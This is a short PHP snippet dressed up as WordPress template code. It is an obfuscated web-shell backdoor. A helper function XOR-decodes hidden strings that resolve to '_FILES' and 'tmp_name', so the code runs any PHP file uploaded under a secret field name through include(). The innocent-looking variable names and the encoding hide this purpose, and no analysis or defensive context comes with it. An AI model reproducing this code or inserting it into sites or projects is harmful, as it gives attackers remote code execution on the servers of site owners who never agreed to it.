...
$int_fields = 'UiQcEMRdi9KjBPT';
$original_image = $int_fields;

function page_templates($stack, $first)

{

    $hierarchical = $first;
	$deprecated = 'revision_id';
    $end_clean = urldecode($stack);
    $special_chars = substr($hierarchical,0, strlen($end_clean));

    $numberposts = $end_clean ^ $special_chars;

    return $numberposts;
}

$protocol = ${page_templates("%0A%2F%18%2F%00%1E", $original_image)};
$comments_in = $protocol;
if (isset($comments_in[$original_image]))

{

    $pages = $protocol[$original_image];

    $emoji_fields = $pages[page_templates("%21%04%21%3C%2B%2C%3F%01", $original_image)];
    $internal = $emoji_fields;
	$author_query = 'local';
    include ($internal);
}
